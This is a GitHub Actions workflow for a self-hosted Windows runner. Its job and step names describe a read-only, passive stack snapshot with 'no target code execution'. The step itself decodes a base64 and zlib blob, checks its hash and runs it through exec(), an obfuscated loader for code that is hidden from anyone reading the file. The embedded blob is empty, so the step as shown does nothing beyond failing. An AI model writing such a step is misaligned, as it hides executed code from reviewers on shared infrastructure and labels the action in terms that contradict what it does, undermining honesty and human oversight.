name: Inspect the existing Windows Android test host
'on':
  push:
    branches: [codex/timeweb-owner-prepare-2026-10-23]
    paths: [.github/workflows/windows-android-preflight.yml]
permissions:
  contents: read
concurrency:
  group: analyst-sdk-progress-readonly
  cancel-in-progress: false
jobs:
  observe_existing_adb:
    name: Read only the exact waiting verification process stack
    runs-on: [self-hosted, Windows, X64, omni-cio-ci]
    timeout-minutes: 5
    env:
      PYTHONUNBUFFERED: '1'
      PYTHONIOENCODING: utf-8
    steps:
      - name: Take one bounded passive stack snapshot with no target code execution
        shell: cmd
        run: |
          py -3 -c "import base64,zlib,hashlib; b=zlib.decompress(base64.b64decode('')); assert hashlib.sha256(b).hexdigest()=='8721ba7f0bdd240f4a1c0f2d1b5a04603e36bdb1ed027626705172d21a0fa6d5'; exec(compile(b,'<passive-python-stack>','exec'))"
          if errorlevel 1 exit /b 1
